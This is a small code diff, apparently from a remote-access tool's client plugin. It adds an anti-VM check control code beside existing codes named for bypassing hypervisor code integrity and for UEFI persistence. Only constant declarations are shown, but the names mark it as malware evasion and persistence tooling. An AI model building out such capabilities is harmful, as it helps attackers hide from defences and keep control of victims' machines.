@@ -72,6 +72,7 @@ namespace Pulsar.Plugins.Client.Modules
         // God-Tier Operations
         public static readonly uint HVCI_BYPASS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x911, METHOD_NEITHER, FILE_ANY_ACCESS);
         public static readonly uint UEFI_PERSIST = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x912, METHOD_NEITHER, FILE_ANY_ACCESS);
+        public static readonly uint ANTIVM_CHECK = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x913, METHOD_NEITHER, FILE_ANY_ACCESS);
 
         [StructLayout(LayoutKind.Sequential)]
         public struct TargetProcess
